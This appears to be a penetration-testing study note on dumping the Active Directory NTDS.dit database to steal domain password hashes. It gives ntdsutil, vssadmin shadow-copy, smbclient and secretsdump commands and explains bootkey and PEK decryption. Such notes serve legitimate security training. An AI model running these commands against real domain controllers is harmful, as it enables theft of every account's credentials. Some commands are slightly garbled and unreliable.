In this topic, the focus is on ways to extract credentials throught the use of a dictionary attack against AD accounts and dumping hashes from from the NTDS.dit file

`NT Directory Services` (`NTDS`) is the directory service used with AD to find & organize network resources. Recall that `NTDS.dit` file is stored at `%systemroot%/ntds` on the domain controllers in a [forest](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model)

The `.dit` stands for [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html).

This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain 
# DUMPING NTDS.dit 
At the core of Active Directory lies the NTDS. Understanding how to obtain information from it becomes crucial. To dump the domain database, we have two main methods: one from the Domain Controller itself using tools like ntdsutil.exe or vssadmin, and another online using tools like impacket’s secretsdump script or mimikatz with the lsadump::dsync command.
1. From domain controller: utilizing `ntds.exe`
```powershell 
ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\tmp'
```
the issued command performs a pivotal task: creating a copy of the NTDS and subsequent copies of the SYSTEM and SECURITY registry hives [[SAM, SECURITY and SYSTEM ]]]
- The SYSTEM HIVE  has the `Syskey/BootKey
- The key plays a role in decryption 
	1. **First level**- Decrypt the Password Encryption Key(PEK). The PEK is initially encrypted with the bootkey using RC4
	2. **Second Level**- Initiate the first of decrypting hashes with the PEK using RC4
	3. **Third level**- Progress to the second level of decrypting hashes using DES 
	Obtaining the bootkey allows us to decrypt the NTDS content 
	Download the files:
	```bash 
	smbclient.py username@host 
	shares 
	use C$ 
			cd temp and get the files `ntds.dit`
	```
	THEN secretsdump.py
	```bash
	secretsdump.py -system SYSTEM -ntds ntds.dit local 
	```
	

2.   Using VSSADMIN 
We can use `vssadmin` to create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (`VSS`) of the `C:` drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on `C:` as that is the default location selected at install, but it is possible to change the location. We use VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down
```powershell 
vssadmin CREATE SHADOW /For=C:
```
Copy to another location: 
```powershell 
	cmd.exe  /c copy \\? 
	\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit 
	c:\NTDS\NTDS.dit 
```